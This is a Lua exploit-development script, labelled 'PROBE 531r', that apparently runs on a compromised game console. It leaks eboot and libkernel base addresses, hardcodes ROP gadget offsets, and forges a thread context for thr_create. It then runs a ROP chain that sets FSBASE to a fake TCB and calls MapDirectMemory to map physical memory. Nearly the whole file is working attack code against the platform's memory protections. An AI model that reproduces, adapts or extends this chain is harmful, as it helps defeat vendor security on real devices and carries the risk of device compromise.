-- CRASH_CLASS: HIGH
-- PROBE 531r: MapDirectMemory via thr_create ROP chain
--
-- Based on 531p (confirmed working thr_create child execution).
-- Plan:
-- 1. thr_create child with RIP=pop_rax_ret, RSP=chain
-- 2. Chain: sysarch(129) for TLS, then MapDirectMemory
-- 3. r8/r9 set via initial register state
--
-- ROP chain layout:
--   pop rax → 165 (sysarch)
--   pop rdi → 129 (SET_FSBASE)
--   pop rsi → &fake_tcb
--   syscall; ret
--   pop rdi → &va_out
--   pop rsi → 0x4000 (len)
--   pop rdx → 3 (prot RW)
--   pop rcx → 0 (flags)
--   ret → map_fn
--   [ret_addr] [name=NULL]
--   pop rdi → &shared (store rv)
--   mov [rdi], rax; ret
--   pop rax → marker
--   pop rdi → &shared+8
--   mov [rdi], rax; ret
--   pop rax → 431 (thr_exit)
--   syscall; ret

print("=== PROBE 531r: ROP MAPDM ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

-- NO signal masking (kills thr_create on 14.10)

local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)

local ok_pid, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

-- Get eboot + libkernel bases
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eb=" .. q(eboot))

zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi or 0, lk_lo or 0))
print("lk=" .. q(lk))

-- Gadgets
local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)
local pop_rdx_ret = eboot + uint64(0x3B02D7)
local pop_rcx_ret = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local syscall_ret = syscall.pipe.fn_addr
local alloc_fn = lk + uint64(0x17EF0)
local map_fn = lk + uint64(0x15020)

-- Find jmp $ (EB FE)
local jmp_self = nil
for off = 0, 0x100000, 4 do
    local v = rd(eboot + off)
    if v then
        local vn = v; if vn < 0 then vn = vn + 0x100000000 end
        if (vn % 0x10000) == 0xFEEB then
            jmp_self = eboot + uint64(off)
            break
        end
        if math.floor(vn / 0x100) % 0x10000 == 0xFEEB then
            jmp_self = eboot + uint64(off + 1)
            break
        end
    end
end
print("jmp$=" .. (jmp_self and q(jmp_self) or "NONE"))

-- [A] AllocateDirectMemory
print("[A] Alloc phys")
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  phys=" .. q(phys))
if not phys or to_num(phys) == 0 then print("FAIL alloc") return end

-- [B] Allocate pages
print("[B] Setup")
local page = 0x4000

-- Shared communication page
local ok_s, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(page), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, page)
-- shared[0] = rv from MapDM
-- shared[8] = done marker
-- shared[0x10] = VA output (where MapDM writes the mapped VA)
-- shared[0x18] = sysarch rv (debug)
wq(shared + 0x00, uint64(0xDEADDEAD))
wq(shared + 0x08, uint64(0xBEEFBEEF))
wq(shared + 0x10, uint64(0))
wq(shared + 0x18, uint64(0xAAAA))

-- Fake TCB page (for sysarch SET_FSBASE)
local ok_t, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(page), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
-- Fill with self-pointer (tcb->tcb_self = tcb at offset 0)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end

-- Pointer to fake_tcb (sysarch needs &fsbase, which points to tcb)
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, tcb_page)

-- Child stack (4 pages = 64KB)
local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(page * 4), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(stack_base, page)  -- zero first page for chain area

print("  shared=" .. q(shared))
print("  tcb=" .. q(tcb_page))
print("  stack=" .. q(stack_base))

-- [C] Build ROP chain at stack_base
print("[C] ROP chain")

-- Chain lives at stack_base. RSP will point here.
-- RIP = pop_rax_ret, so first thing: pop [RSP] into RAX
local chain = stack_base
local i = 0
local function emit(val)
    wq(chain + i, val)
    i = i + 8
end

-- Phase 1: sysarch(165, AMD64_SET_FSBASE=129, &fake_tcb)
-- pop rax → 165
emit(uint64(165))        -- [0] RAX value
-- pop rdi → 129
emit(pop_rdi_ret)        -- [8]
emit(uint64(129))        -- [16] RDI = 129
-- pop rsi → &tcb_ptr
emit(pop_rsi_ret)        -- [24]
emit(uint64(tcb_ptr_buf))-- [32] RSI = &tcb pointer
-- syscall; ret
emit(syscall_ret)        -- [40]

-- Store sysarch rv to shared+0x18 for debug
emit(pop_rdi_ret)        -- [48]
emit(shared + 0x18)      -- [56] RDI = &shared[0x18]
emit(mov_rdi_rax_ret)    -- [64] [RDI] = RAX (sysarch rv)

-- Phase 2: MapDirectMemory(out_ptr, len, prot, flags, phys, align, name)
-- r8 = phys (from initial regs, preserved through sysarch)
-- r9 = align (from initial regs)
-- pop rdi → &shared[0x10] (out_ptr: kernel writes VA here)
emit(pop_rdi_ret)        -- [72]
emit(shared + 0x10)      -- [80]
-- pop rsi → 0x4000 (len)
emit(pop_rsi_ret)        -- [88]
emit(uint64(0x4000))     -- [96]
-- pop rdx → 3 (prot = RW)
emit(pop_rdx_ret)        -- [104]
emit(uint64(3))          -- [112]
-- pop rcx → 0 (flags)
emit(pop_rcx_ret)        -- [120]
emit(uint64(0))          -- [128]
-- ret → map_fn
-- When pop rcx does ret, it pops chain[i] into RIP
emit(map_fn)             -- [136] RIP = MapDirectMemory

-- map_fn sees stack:
-- [rsp+0] = return address
-- [rsp+8] = 7th arg (name = NULL)
local post_call = chain + i + 16
emit(uint64(post_call))  -- [144] return address
emit(uint64(0))          -- [152] name = NULL

-- Post-call: RAX = MapDirectMemory return value
-- Store rv to shared[0]
emit(pop_rdi_ret)        -- [160] = post_call
emit(shared + 0x00)      -- [168]
emit(mov_rdi_rax_ret)    -- [176]

-- Store "DONE" marker to shared[8]
emit(pop_rdi_ret)        -- [184]
emit(shared + 0x08)      -- [192]
emit(pop_rax_ret)        -- [200]
emit(uint64(0x444F4E45)) -- [208] "DONE"
emit(mov_rdi_rax_ret)    -- [216]

-- thr_exit(431)
emit(pop_rax_ret)        -- [224]
emit(uint64(431))        -- [232]
emit(syscall_ret)        -- [240]

print(string.format("  chain=%d bytes (%d entries)", i, i / 8))

-- [D] Build context
print("[D] Context")
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)

-- Gates
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))

-- Segments
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x100, uint64(0x3B))

-- RFLAGS
wq(ctx + 0x0F0, uint64(0x202))

-- RIP = pop_rax_ret (start of chain)
wq(ctx + 0x0E0, pop_rax_ret)
-- RSP = chain start
wq(ctx + 0x0F8, chain)

-- GPRs (Sony layout):
-- +0x048 = RDI (unused, chain sets it)
-- +0x068 = R8 = phys offset
wq(ctx + 0x068, phys)
-- +0x070 = R9 = alignment
wq(ctx + 0x070, uint64(0x4000))
-- +0x078 = RAX (unused, pop_rax_ret sets it from chain)

print("  r8(phys)=" .. q(phys))
print("  rip=" .. q(pop_rax_ret))
print("  rsp=" .. q(chain))

-- [E] Spawn
print("[E] thr_create")
local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(rq(tid_buf)))

if to_num(rv_tc) ~= 0 then
    print("  CONTEXT REJECTED")
    print("=== 531r DONE ===")
    return
end

-- [F] Wait for child (check shared[8] for done marker)
print("[F] Wait")
local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 100000000)  -- 100ms
local done = false
for attempt = 1, 10 do
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local m = rq(shared + 0x08)
    if m then
        local mn = to_num(m)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn ~= 0 and mn ~= 0xBEEFBEEF then
            done = true
            break
        end
    end
end

-- [G] Results
print("[G] Results")
print("  rv=" .. q(rq(shared + 0x00)))
print("  marker=" .. q(rq(shared + 0x08)) .. " done=" .. tostring(done))
print("  va=" .. q(rq(shared + 0x10)))
print("  sysarch_rv=" .. q(rq(shared + 0x18)))

-- [H] If VA was written, try reading mapped memory
local va_out = rq(shared + 0x10)
if va_out and to_num(va_out) ~= 0 then
    print("[H] MAPPED MEMORY!")
    local van = to_num(va_out)
    -- Try writing and reading
    local ok_w = pcall(function() memory.write_dword(van, 0xCAFEBABE) end)
    local rb = rd(van)
    if rb then
        if rb < 0 then rb = rb + 0x100000000 end
        print(string.format("  write/read: 0x%08X", rb))
    else
        print("  read FAULT")
    end
    for off = 0, 0x1C, 4 do
        local d = rd(van + off)
        if d then
            if d < 0 then d = d + 0x100000000 end
            print(string.format("  [+0x%02X] 0x%08X", off, d))
        end
    end
else
    print("  NO VA returned")
end

-- thr_kill check
local ok_k, rv_k = pcall(function() return sc_thr_kill(rq(tid_buf), uint64(0)) end)
print("  thr_kill=" .. tostring(to_num(rv_k)))

print("=== 531r DONE ===")
